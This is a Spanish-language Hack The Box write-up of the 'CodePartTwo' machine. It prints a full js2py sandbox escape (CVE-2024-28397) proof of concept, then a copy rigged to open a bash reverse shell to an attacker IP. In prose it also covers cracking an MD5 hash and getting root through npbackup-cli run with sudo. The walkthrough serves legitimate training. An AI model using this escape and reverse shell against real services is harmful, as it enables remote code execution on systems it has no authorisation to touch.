---
title: CodePartTwo WriteUp Hack The Box
published: true
---

# Introducción

**CodePartTwo** es una máquina de **HackTheBox** fácil y continuación de la máquina **Code**. Para resolverla empezamos enumerando los puertos y servicios expuestos. En la aplicación web hay un botón que permite descargar todo el código del sitio; al revisarlo obtendremos el árbol de directorios y archivos.

Más adelante explotaremos una sandbox de **JavaScript** usando un vector de escape que nos permitirá establecer una conexión remota como el usuario **app**. Desde ese acceso podremos consultar la base de datos y recuperar la contraseña de **marco**, que está almacenada en **MD5**; con ella conseguiremos la primera flag.

Tras una nueva enumeración sobre las capacidades del usuario **marco**, descubriremos que puede ejecutar la herramienta **npbackup-cli** con privilegios de administrador. Aprenderemos a usarla, desarrollaremos un exploit para escalar privilegios y, finalmente, abriremos una segunda conexión remota para obtener acceso como root y capturar la flag final.

<img src="https://github.com/user-attachments/assets/f64e4c60-7deb-4c03-aa16-716a2e3d60ac" />

# Enumeración
Comenzando con nmap, descubriremos que están abiertos **el puerto 22 (SSH)** y **el puerto 8000 (HTTP con Gunicorn 20.0.4)**.

<img src="https://github.com/user-attachments/assets/3bf506a2-16e6-4ff3-adfe-9017dee97a35" />

No se puede acceder al puerto 22 porque no disponemos de credenciales; al abrir el puerto 8000 se muestra la siguiente página. En la web aparecen tres botones: **login**, **register** y **download app**.

<img src="https://github.com/user-attachments/assets/ac8e243c-d12f-460a-9b62-fee8c21cecb9" />

Si pulsamos **download app** descargaremos un archivo ZIP que, al descomprimirlo, revela la estructura completa del proyecto; esto será clave para localizar la base de datos cuando obtengamos acceso al sistema.

<img src="https://github.com/user-attachments/assets/24e87760-ef98-4151-aad3-6c1c3bd5fea4" />

Solo queda probar a registrarse e iniciar sesión.

<img src="https://github.com/user-attachments/assets/744a8ec6-3a06-4c12-9a4d-46024861fea6" />

Al iniciar sesión en la web encontraremos una sandbox de JavaScript. Al probar distintos scripts veremos que algunas funciones están **saneadas** y no podremos ejecutar ciertos fragmentos de código.

<img src="https://github.com/user-attachments/assets/760b26b6-15f3-4238-bec3-a571d56a8d8a" />

# Explotación

Sabiendo que varias funciones están saneadas, buscaremos una forma de escapar de la sandbox. Al buscar en GitHub términos como **"scape js sandbox github poc"** encontraremos esta [prueba de concepto](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py). 

```java
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator; kcalc; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
```

Este código construye la cadena de comando en **cmd** (`head -n 1 /etc/passwd; calc; gnome-calculator; kcalc;`).
Obtiene la lista de nombres de propiedades de un objeto vacío con **Object.getOwnPropertyNames({})** y la guarda en **hacked**. Accede a métodos especiales usando esas propiedades: extrae **getattribute** (vía **bymarve** y **n11**) para consultar atributos internos de objetos. Sube por la jerarquía de clases con **n11("**class**").**base**** para llegar a la clase base y asigna su **getattribute** a **getattr**.
Define la función **findpopen(o)** que recorre recursivamente **o.**subclasses**()** buscando una clase cuyo módulo sea **"subprocess"** y cuyo nombre sea **"Popen"**; si la encuentra, la retorna.
Llama a **findpopen(obj)** para obtener la clase **Popen**, crea una instancia pasando **cmd** y parámetros (incluyendo `true` para `shell=True`) y ejecuta **communicate()** para ejecutar el comando y obtener su salida.
Ahora que entendemos el script, solo tendremos que modificar el parámetro **cmd** para establecer una conexión remota con la máquina.

```java

let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.119/4444 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
```

Usando netcat nos pondremos a la escucha en el puerto correspondiente; al ejecutar el código en la web obtendremos una reverse shell como el usuario **app**.

<img src="https://github.com/user-attachments/assets/38886c51-2761-4633-a8c2-bf2a576c8133" />

Una vez dentro del sistema y con la ubicación de la base de datos identificada en la fase de enumeración, buscamos el archivo de la base de datos y, usando **sqlite3**, ejecutamos una consulta para listar los usuarios registrados. Nos fijamos en el primer usuario creado, **marco**, y procedemos a crackear su contraseña.

<img src="https://github.com/user-attachments/assets/c45bca0c-769c-4a81-8b48-a52b472e3d57" />

La contraseña de **marco** parece estar cifrada con MD5; usando la web de **CrackStation** podremos descifrarla rápidamente.

<img src="https://github.com/user-attachments/assets/bf15582b-4804-40fe-86d5-0fedd0afe54c" />

Con la contraseña podremos acceder por SSH como **marco** y obtener la primera flag.

<img src="https://github.com/user-attachments/assets/4cd1aa5a-d6d3-4ef6-8f47-19065c5a7096" />

# Escalada de privilegios
Una vez dentro del sistema, enumeraremos todo lo que puede hacer el usuario **marco** con el siguiente comando. En la imagen siguiente se muestra que **marco** puede ejecutar el programa **npbackup-cli** con privilegios de administrador.

<img src="https://github.com/user-attachments/assets/afbaed63-e18c-4c9a-a927-6d667df27bb4" />

Lo primero es conocer la aplicación y sus opciones; con el parámetro **-h** obtendremos la información necesaria para resolver el puzzle y escalar privilegios.

<img src="https://github.com/user-attachments/assets/c3a48ee2-ef29-4370-ba84-fb326aacd417" />

Para usar la aplicación necesitamos un archivo de configuración (ubicado en el directorio de **marco**) y crear un archivo adicional que nos permita escalar privilegios.

<img src="https://github.com/user-attachments/assets/200cd85c-d22b-47ab-a527-01da83235940" />

Dado que el programa se ejecutará con privilegios de root, es necesario crear un archivo que inicie la conexión remota; al ejecutarlo como root, la shell remota heredará privilegios de administrador.

<img src="https://github.com/user-attachments/assets/ae655849-fd37-462e-b987-f1818a42e481" />

Ahora ya tenemos todo listo para el paso final: primero nos pondremos a la escucha con netcat en el puerto correspondiente; a continuación ejecutaremos la aplicación con privilegios de administrador, indicando el archivo de configuración, el script de conexión remota creado anteriormente y el nombre del backup.

<img src="https://github.com/user-attachments/assets/f7a67c90-d188-41a6-9535-8ee68ff18039" />

Finalmente recibimos la conexión con permisos de administrador y obtendremos la flag final.

# Conclusión

En CodeTwo realizamos enumeración, revisión del código descargado, escape de sandbox y escalada mediante una herramienta con privilegios. La descarga del código nos dio el árbol de archivos y la ubicación de la base de datos; la PoC de js2py nos sirvió para escapar de la sandbox y obtener una reverse shell como **app**. Desde ahí, con sqlite3 y CrackStation recuperamos la contraseña de **marco**, accedimos por SSH y conseguimos la primera flag.

La enumeración posterior reveló que **marco** podía ejecutar **npbackup-cli** como root; creando el archivo de configuración y un script de reverse shell, y ejecutando la aplicación con privilegios, conseguimos una shell con permisos de root y la flag final.

![ken](https://github.com/user-attachments/assets/72728de9-7526-441a-9f6c-e8456e9d5128)
